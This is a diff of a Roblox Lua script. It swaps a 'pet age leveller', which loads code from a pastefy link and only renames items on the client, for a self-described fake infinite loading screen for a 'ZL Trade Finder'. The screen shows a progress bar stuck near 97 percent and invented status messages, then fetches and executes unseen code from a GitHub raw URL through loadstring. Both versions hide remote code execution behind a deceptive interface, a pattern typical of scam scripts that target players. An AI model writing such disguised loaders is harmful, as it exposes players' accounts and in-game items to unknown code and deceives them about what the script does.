@@ -1,218 +1,217 @@
-loadstring(game:HttpGet("https://pastefy.app/wnnlVE7f/raw"))()
-local Players = game:GetService("Players")
-local TweenService = game:GetService("TweenService")
-local plr = Players.LocalPlayer
-local char = plr.Character or plr.CharacterAdded:Wait()
+-- ZL Trade Finder Fake Infinite Loading Screen
+-- Put this in StarterPlayerScripts as a LocalScript
 
--- Create GUI Root
+local player = game.Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- GUI
 local gui = Instance.new("ScreenGui")
-gui.Name = "CheriPetAgeLeveller"
+gui.Name = "ZLTradeFinderLoader"
 gui.ResetOnSpawn = false
-gui.Parent = plr:WaitForChild("PlayerGui")
+gui.Parent = playerGui
 
--- Helper function to create UI instances
-local function create(class, props, parent)
-	local inst = Instance.new(class)
-	for k, v in pairs(props) do inst[k] = v end
-	inst.Parent = parent
-	return inst
-end
+-- Main Frame
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 700, 0, 320)
+frame.Position = UDim2.new(0.5, -350, 0.5, -160)
+frame.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
+frame.BorderSizePixel = 0
+frame.Parent = gui
 
-------------------------------------------------------
--- 🌸 MINI CUTE LOADING SCREEN (CENTERED, NOT FULLSCREEN)
-------------------------------------------------------
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 20)
+corner.Parent = frame
 
-local loadingPopup = create("Frame", {
-	Name = "LoadingPopup",
-	Size = UDim2.new(0, 300, 0, 100),
-	Position = UDim2.new(0.5, -150, 0.5, -50),
-	BackgroundColor3 = Color3.fromRGB(255, 240, 250),
-}, gui)
+-- Gradient
+local gradient = Instance.new("UIGradient")
+gradient.Color = ColorSequence.new{
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(0,0,0)),
+	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0,55,140)),
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(0,0,0))
+}
+gradient.Rotation = 25
+gradient.Parent = frame
 
-create("UICorner", { CornerRadius = UDim.new(0, 12) }, loadingPopup)
-create("UIStroke", { Color = Color3.fromRGB(255, 180, 200), Thickness = 2 }, loadingPopup)
-
-create("UIGradient", {
-	Color = ColorSequence.new{
-		ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 215, 235)),
-		ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 240, 250)),
-	}
-}, loadingPopup)
-
-local loadingLabel = create("TextLabel", {
-	Text = "🌷 Loading Cheri's UI...",
-	Font = Enum.Font.GothamBold,
-	TextSize = 20,
-	TextColor3 = Color3.fromRGB(255, 105, 180),
-	BackgroundTransparency = 1,
-	Size = UDim2.new(1, 0, 1, 0),
-}, loadingPopup)
-
-------------------------------------------------------
--- 🌟 MAIN GUI (Hidden Until Loading Ends)
-------------------------------------------------------
-
-local frame = create("Frame", {
-	Name = "PetAgeFrame",
-	Size = UDim2.new(0, 320, 0, 190),
-	Position = UDim2.new(0.5, -160, 0.5, -95),
-	BackgroundColor3 = Color3.fromRGB(255, 230, 240),
-	Visible = false,
-	Active = true,
-	Draggable = true
-}, gui)
-
-create("UICorner", { CornerRadius = UDim.new(0, 12) }, frame)
-create("UIStroke", { Color = Color3.fromRGB(255, 180, 200), Thickness = 2 }, frame)
+-- Outline
+local stroke = Instance.new("UIStroke")
+stroke.Color = Color3.fromRGB(0, 120, 255)
+stroke.Thickness = 3
+stroke.Parent = frame
 
 -- Title
-create("TextLabel", {
-	Text = "🐾 Cheri's Pet Age Leveller 🐾",
-	Font = Enum.Font.FredokaOne,
-	TextSize = 20,
-	TextColor3 = Color3.fromRGB(255, 105, 180),
-	BackgroundTransparency = 1,
-	Size = UDim2.new(1, 0, 0, 30),
-	Position = UDim2.new(0, 0, 0, 6)
-}, frame)
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1,0,0,70)
+title.Position = UDim2.new(0,0,0,25)
+title.BackgroundTransparency = 1
+title.Text = "Loading ZL Trade Finder"
+title.TextColor3 = Color3.fromRGB(0,170,255)
+title.Font = Enum.Font.GothamBold
+title.TextScaled = true
+title.Parent = frame
 
--- Close Button
-local closeBtn = create("TextButton", {
-	Text = "✖",
-	Font = Enum.Font.FredokaOne,
-	TextSize = 18,
-	TextColor3 = Color3.fromRGB(255, 255, 255),
-	BackgroundColor3 = Color3.fromRGB(200, 80, 100),
-	Size = UDim2.new(0, 30, 0, 30),
-	Position = UDim2.new(1, -35, 0, 6)
-}, frame)
-create("UICorner", {}, closeBtn)
+-- Divider
+local divider = Instance.new("TextLabel")
+divider.Size = UDim2.new(1,0,0,30)
+divider.Position = UDim2.new(0,0,0,90)
+divider.BackgroundTransparency = 1
+divider.Text = "────────── ZL ──────────"
+divider.TextColor3 = Color3.fromRGB(0,120,255)
+divider.Font = Enum.Font.GothamBold
+divider.TextScaled = true
+divider.Parent = frame
 
-closeBtn.MouseButton1Click:Connect(function()
-	frame.Visible = false
-end)
+-- Status
+local status = Instance.new("TextLabel")
+status.Size = UDim2.new(1,0,0,40)
+status.Position = UDim2.new(0,0,0,135)
+status.BackgroundTransparency = 1
+status.Text = "Analyzing trade data..."
+status.TextColor3 = Color3.fromRGB(0,150,255)
+status.Font = Enum.Font.Gotham
+status.TextScaled = true
+status.Parent = frame
 
--- Pet Info Label
-local petInfo = create("TextLabel", {
-	Text = "Equipped Pet: [None]",
-	Font = Enum.Font.GothamMedium,
-	TextSize = 16,
-	TextColor3 = Color3.fromRGB(100, 0, 80),
-	BackgroundTransparency = 1,
-	Size = UDim2.new(1, -24, 0, 24),
-	Position = UDim2.new(0, 12, 0, 44),
-	TextXAlignment = Enum.TextXAlignment.Left
-}, frame)
+-- Progress Bar BG
+local barBG = Instance.new("Frame")
+barBG.Size = UDim2.new(0.82,0,0,34)
+barBG.Position = UDim2.new(0.09,0,0,195)
+barBG.BackgroundColor3 = Color3.fromRGB(10,10,10)
+barBG.BorderSizePixel = 0
+barBG.Parent = frame
 
--- Button: Set Age to 50
-local btn1 = create("TextButton", {
-	Text = "🌸 Set Age to 50",
-	Font = Enum.Font.GothamBold,
-	TextSize = 16,
-	TextColor3 = Color3.fromRGB(255, 255, 255),
-	BackgroundColor3 = Color3.fromRGB(255, 160, 180),
-	Size = UDim2.new(0.9, 0, 0, 36),
-	Position = UDim2.new(0.5, -0.45 * 320, 0, 84)
-}, frame)
-create("UICorner", {}, btn1)
+local bgCorner = Instance.new("UICorner")
+bgCorner.CornerRadius = UDim.new(1,0)
+bgCorner.Parent = barBG
 
--- Button: Add +1 Age
-local btn2 = create("TextButton", {
-	Text = "🌷 Add +1 Age",
-	Font = Enum.Font.GothamBold,
-	TextSize = 16,
-	TextColor3 = Color3.fromRGB(255, 255, 255),
-	BackgroundColor3 = Color3.fromRGB(255, 160, 180),
-	Size = UDim2.new(0.9, 0, 0, 36),
-	Position = UDim2.new(0.5, -0.45 * 320, 0, 132)
-}, frame)
-create("UICorner", {}, btn2)
+-- Fill
+local fill = Instance.new("Frame")
+fill.Size = UDim2.new(0.92,0,1,0)
+fill.BackgroundColor3 = Color3.fromRGB(0,140,255)
+fill.BorderSizePixel = 0
+fill.Parent = barBG
 
--- Footer
-create("TextLabel", {
-	Text = "Tiktok: @cheri6233🌸🌈",
-	Font = Enum.Font.Gotham,
-	TextSize = 13,
-	TextColor3 = Color3.fromRGB(120, 80, 120),
-	BackgroundTransparency = 1,
-	Size = UDim2.new(1, 0, 0, 20),
-	Position = UDim2.new(0, 0, 1, -22)
-}, frame)
+local fillCorner = Instance.new("UICorner")
+fillCorner.CornerRadius = UDim.new(1,0)
+fillCorner.Parent = fill
 
-------------------------------------------------------
--- 💡 FUNCTIONALITY
-------------------------------------------------------
+-- Shine
+local shine = Instance.new("Frame")
+shine.Size = UDim2.new(0,60,1,0)
+shine.BackgroundColor3 = Color3.fromRGB(255,255,255)
+shine.BackgroundTransparency = 0.7
+shine.BorderSizePixel = 0
+shine.Parent = fill
 
--- Function to get equipped pet
-local function getPet()
-	char = plr.Character or plr.CharacterAdded:Wait()
-	for _, tool in pairs(char:GetChildren()) do
-		if tool:IsA("Tool") and tool.Name:find("Age") then
-			return tool
+local shineCorner = Instance.new("UICorner")
+shineCorner.CornerRadius = UDim.new(1,0)
+shineCorner.Parent = shine
+
+-- Percentage
+local percent = Instance.new("TextLabel")
+percent.Size = UDim2.new(0,80,1,0)
+percent.Position = UDim2.new(1,-90,0,0)
+percent.BackgroundTransparency = 1
+percent.Text = "97%"
+percent.TextColor3 = Color3.fromRGB(255,255,255)
+percent.Font = Enum.Font.GothamBold
+percent.TextScaled = true
+percent.Parent = barBG
+
+-- Bottom Text
+local almost = Instance.new("TextLabel")
+almost.Size = UDim2.new(1,0,0,30)
+almost.Position = UDim2.new(0,0,0,240)
+almost.BackgroundTransparency = 1
+almost.Text = "Almost there..."
+almost.TextColor3 = Color3.fromRGB(180,180,180)
+almost.Font = Enum.Font.Gotham
+almost.TextScaled = true
+almost.Parent = frame
+
+-- Tips
+local tip = Instance.new("TextLabel")
+tip.Size = UDim2.new(1,0,0,30)
+tip.Position = UDim2.new(0,0,0,275)
+tip.BackgroundTransparency = 1
+tip.Text = "Tip: Bigger trades have higher value!"
+tip.TextColor3 = Color3.fromRGB(120,120,120)
+tip.Font = Enum.Font.Gotham
+tip.TextScaled = true
+tip.Parent = frame
+
+-- Loading Messages
+local messages = {
+	"Analyzing trade data",
+	"Loading inventories",
+	"Syncing values",
+	"Scanning servers",
+	"Configuring assets",
+	"Preparing UI",
+	"Checking player data",
+	"Optimizing trades",
+	"Fetching market values"
+}
+
+-- Status Animation
+task.spawn(function()
+	local index = 1
+
+	while true do
+		local msg = messages[index]
+
+		for i = 1,3 do
+			status.Text = msg .. string.rep(".", i)
+			task.wait(0.5)
+		end
+
+		index += 1
+		if index > #messages then
+			index = 1
 		end
 	end
-end
-
--- Update pet label
-local function updateLabel()
-	local pet = getPet()
-	petInfo.Text = "Equipped Pet: " .. (pet and pet.Name or "[None]")
-end
-
--- Set Age to 50
-btn1.MouseButton1Click:Connect(function()
-	local pet = getPet()
-	if pet then
-		for i = 3, 1, -1 do
-			btn1.Text = "⏳ Changing Age in " .. i .. "..."
-			task.wait(1)
-		end
-		pet.Name = pet.Name:gsub("%[Age%s%d+%]", "[Age 50]")
-		updateLabel()
-	else
-		btn1.Text = "⚠️ No Pet Equipped!"
-		task.wait(2)
-	end
-	btn1.Text = "🌸 Set Age to 50"
 end)
 
--- Add +1 Age
-btn2.MouseButton1Click:Connect(function()
-	local pet = getPet()
-	local age = pet and tonumber(pet.Name:match("%[Age%s(%d+)%]"))
-	if pet and age then
-		if age >= 100 then
-			btn2.Text = "⚠️ Max Age is 100!"
-			task.wait(2)
-		else
-			for i = 3, 1, -1 do
-				btn2.Text = "⏳ Adding +1 in " .. i .. "..."
-				task.wait(1)
-			end
-			local newAge = age + 1
-			pet.Name = pet.Name:gsub("%[Age%s%d+%]", "[Age " .. newAge .. "]")
-			updateLabel()
+-- Fake Progress
+task.spawn(function()
+	local fakeProgress = 92
+
+	while true do
+		fakeProgress += math.random(0,1) * 0.1
+
+		if fakeProgress >= 98 then
+			fakeProgress = 96.8
 		end
-	else
-		btn2.Text = "⚠️ No Pet Equipped!"
-		task.wait(2)
+
+		fill.Size = UDim2.new(fakeProgress/100,0,1,0)
+		percent.Text = math.floor(fakeProgress) .. "%"
+
+		task.wait(0.15)
 	end
-	btn2.Text = "🌷 Add +1 Age"
 end)
 
--- Constant label updater
+-- Shine Animation
 task.spawn(function()
 	while true do
-		updateLabel()
+		shine.Position = UDim2.new(-0.2,0,0,0)
+
+		for i = -0.2,1.2,0.02 do
+			shine.Position = UDim2.new(i,0,0,0)
+			task.wait(0.01)
+		end
+
 		task.wait(1)
 	end
 end)
 
--- Fade out loading screen & show GUI
-task.delay(2.5, function()
-	local tween = TweenService:Create(loadingPopup, TweenInfo.new(1), {BackgroundTransparency = 1})
-	tween:Play()
-	tween.Completed:Wait()
-	loadingPopup:Destroy()
-	frame.Visible = true
+-- Gradient Animation
+task.spawn(function()
+	while true do
+		gradient.Rotation += 0.2
+		task.wait(0.01)
+	end
+end)
+
+-- Execute Script After Delay
+task.delay(8, function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/775vwfz2w6-ctrl/ZLPVP-FINDERTRADES/refs/heads/main/ZLPVPFINDERTRADES"))()
 end)
